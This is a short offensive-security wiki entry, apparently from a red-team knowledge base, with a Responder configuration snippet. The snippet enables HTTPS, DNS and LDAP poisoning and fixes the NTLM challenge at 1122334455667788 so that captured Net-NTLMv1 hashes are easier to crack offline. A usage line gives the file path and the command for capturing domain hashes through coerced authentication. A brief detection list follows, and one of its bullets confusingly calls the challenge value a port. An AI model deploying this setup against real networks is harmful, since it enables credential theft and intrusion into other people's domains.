---
type: code
language: ini
verified: true
created_at: '2023-04-06T03:56:05.187734+00:00'
updated_at: '2023-04-10T20:35:59.630562+00:00'
platforms:
  - Linux
tags:
  - ntlm
  - config
  - poisoning
validated: true
---

# responder-custom-challenge-config

## Code

```ini
HTTPS = On
DNS = On
LDAP = On
...
; Custom challenge.
; Use "Random" for generating a random challenge for each requests (Default)
Challenge = 1122334455667788
```

## Description

This configuration snippet for Responder enables poisoning of HTTPS, DNS, and LDAP traffic and sets a fixed NTLM challenge (1122334455667788) to produce consistent hash responses for easier offline cracking in Net-NTLMv1 attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Challenge | Fixed 16-byte hex challenge for NTLM auth | 1122334455667788 |

## Usage

Paste into `/etc/responder/Responder.conf` before starting Responder with `responder -I interface -w -r -f`. Used in NTLM relay/poisoning scenarios to capture domain hashes via coerced auth.

## Detection

- Responder process running on non-standard ports (e.g., 1122334455667788 in logs).
- Anomalous DNS/LDAP responses from rogue server.
- Network traffic showing fixed challenge in NTLMSSP exchanges (Wireshark filter: ntlmssp).

## Related

- [[procedures/Capture-and-Crack-Net-NTLMv1-Hashes]]
- [[tools/Responder]]
